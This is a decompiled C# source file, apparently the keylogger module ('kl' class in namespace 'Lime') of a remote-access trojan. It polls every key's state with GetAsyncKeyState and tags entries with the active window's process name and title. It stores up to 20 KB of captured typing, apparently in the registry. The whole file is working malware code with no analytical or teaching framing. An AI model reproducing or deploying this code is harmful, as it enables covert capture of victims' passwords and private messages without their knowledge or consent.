using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Lime;

public class kl
{
	private string LastAS;

	private int LastAV;

	private Keys lastKey;

	public string Logs;

	public string vn;

	public kl()
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		lastKey = (Keys)0;
		Logs = "";
		vn = "[kl]";
	}

	private string AV()
	{
		try
		{
			IntPtr foregroundWindow = Core.GetForegroundWindow();
			int b = default(int);
			GetWindowThreadProcessId(foregroundWindow, ref b);
			Process processById = Process.GetProcessById(b);
			if (!(((foregroundWindow.ToInt32() == LastAV) & (Operators.CompareString(LastAS, processById.MainWindowTitle, false) == 0)) | (processById.MainWindowTitle.Length == 0)))
			{
				LastAV = foregroundWindow.ToInt32();
				LastAS = processById.MainWindowTitle;
				return "\r\n\u0001" + DateAndTime.get_Now().ToString("yy/MM/dd ") + processById.ProcessName + " " + LastAS + "\u0001\r\n";
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return "";
	}

	private string Fix(Keys k)
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Invalid comparison between Unknown and I4
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Invalid comparison between Unknown and I4
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Invalid comparison between Unknown and I4
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Invalid comparison between Unknown and I4
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_004c: Invalid comparison between Unknown and I4
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_008c: Invalid comparison between Unknown and I4
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Invalid comparison between Unknown and I4
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Invalid comparison between Unknown and I4
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b4: Invalid comparison between Unknown and I4
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Invalid comparison between Unknown and I4
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c3: Invalid comparison between Unknown and I4
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ce: Invalid comparison between Unknown and I4
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fb: Invalid comparison between Unknown and I4
		//IL_00fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0104: Invalid comparison between Unknown and I4
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Invalid comparison between Unknown and I4
		//IL_0112: Unknown result type (might be due to invalid IL or missing references)
		//IL_0121: Unknown result type (might be due to invalid IL or missing references)
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014b: Expected I4, but got Unknown
		//IL_0168: Unknown result type (might be due to invalid IL or missing references)
		//IL_016e: Expected I4, but got Unknown
		bool flag = Core.F.get_Keyboard().get_ShiftKeyDown();
		if (Core.F.get_Keyboard().get_CapsLock())
		{
			flag = ((!flag) ? true : false);
		}
		string result;
		try
		{
			Keys val = k;
			if ((int)val <= 35)
			{
				if ((int)val <= 13)
				{
					if ((int)val == 8)
					{
						goto IL_00d2;
					}
					if ((int)val != 9)
					{
						if ((int)val != 13)
						{
							goto IL_010f;
						}
						if (Logs.EndsWith("[ENTER]\r\n"))
						{
							return "";
						}
						return "[ENTER]\r\n";
					}
					return "[TAP]\r\n";
				}
				if (val - 16 > 1)
				{
					if ((int)val == 32)
					{
						return " ";
					}
					if ((int)val != 35)
					{
						goto IL_010f;
					}
				}
			}
			else if ((int)val <= 163)
			{
				if ((int)val == 46)
				{
					goto IL_00d2;
				}
				if (val - 112 > 11 && val - 160 > 3)
				{
					goto IL_010f;
				}
			}
			else if ((int)val != 65536 && (int)val != 131072 && (int)val != 262144)
			{
				goto IL_010f;
			}
			return "";
			IL_010f:
			checked
			{
				if (flag)
				{
					return VKCodeToUnicode((uint)k).ToUpper();
				}
				result = VKCodeToUnicode((uint)k);
				goto end_IL_002b;
			}
			IL_00d2:
			return "[" + ((Enum)(Keys)(ref k)).ToString() + "]";
			end_IL_002b:;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			if (flag)
			{
				result = Strings.ChrW((int)k).ToString().ToUpper();
				ProjectData.ClearProjectError();
				string result2 = result;
				ProjectData.ClearProjectError();
				return result2;
			}
			result = Strings.ChrW((int)k).ToString().ToLower();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int a);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyboardLayout(int a);

	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] a);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr a, ref int b);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint a, uint b);

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint a, uint b, byte[] c, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder d, int e, uint f, IntPtr g);

	private static string VKCodeToUnicode(uint a)
	{
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] array = new byte[255];
			if (!GetKeyboardState(array))
			{
				return "";
			}
			uint b = MapVirtualKey(a, 0u);
			int b2 = 0;
			IntPtr g = (IntPtr)GetKeyboardLayout(GetWindowThreadProcessId(Core.GetForegroundWindow(), ref b2));
			ToUnicodeEx(a, b, array, stringBuilder, 5, 0u, g);
			return stringBuilder.ToString();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		Keys val = (Keys)checked((int)a);
		return ((Enum)(Keys)(ref val)).ToString();
	}

	public void WRK()
	{
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		Logs = Conversions.ToString(RuntimeHelpers.GetObjectValue(Core.GTV(vn, "")));
		checked
		{
			try
			{
				int num = 0;
				while (true)
				{
					num++;
					int num2 = 0;
					do
					{
						if ((GetAsyncKeyState(num2) == -32767) & !Core.F.get_Keyboard().get_CtrlKeyDown())
						{
							Keys k = (Keys)num2;
							string text = Fix(k);
							if (text.Length > 0)
							{
								Logs += AV();
								Logs += text;
							}
							lastKey = k;
						}
						num2++;
					}
					while (num2 <= 255);
					if (num == 1000)
					{
						num = 0;
						int num3 = Conversions.ToInteger("20") * 1024;
						if (Logs.Length > num3)
						{
							Logs = Logs.Remove(0, Logs.Length - num3);
						}
						Core.STV(vn, Logs, RegistryValueKind.String);
					}
					Thread.Sleep(1);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception projectError = ex;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
	}
}
